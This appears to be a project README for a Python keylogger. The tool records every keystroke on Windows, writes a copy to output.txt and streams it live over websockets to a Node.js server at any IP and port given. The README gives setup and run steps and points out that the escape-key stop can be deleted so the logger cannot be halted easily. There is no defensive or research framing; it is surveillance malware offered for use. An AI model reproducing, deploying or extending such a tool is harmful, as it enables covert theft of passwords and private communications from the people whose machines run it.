# python_live_keylogger
Python keylogger which reports keystrokes to a Node.js server in real time using websockets.  
The python component has been converted to a windows .exe for portability.  
This executable can be found at /dist/keylogger/keylogger.exe  
Running the executable without parameters reports the keystrokes to localhost:3000  
A different server location can be specified by passing in the ip and port as parameters (keylogger.exe [ip] [port])  
A copy of captured keystrokes is also recorded in a file called output.txt in the directory the program is run from.  
The keylogger can currently be stopped by pressing the escape key. This functionality could easily be removed by deleting  
```
if(event.Ascii == 27):
		sys.exit()
```
I used PyInstaller for the conversion from py to exe (http://www.pyinstaller.org/)  

To run the node server you will need to install node and npm (https://nodejs.org/en/) then run 'npm install' in the keylogger-server folder to install dependencies.  
Then run 'node app.js' in the same folder to start the server.  
Once the server is running, open localhost:3000 in any browser to see recorded keystrokes when the keylogger is running.

If you want to run the python yourself, you'll need to install  
pywin32 (https://sourceforge.net/projects/pywin32/), pyHook (https://sourceforge.net/projects/pyhook/),  
and socketIO for python (https://pypi.python.org/pypi/socketIO-client)  
Then it should be as simple as running 'python keylogger.py'
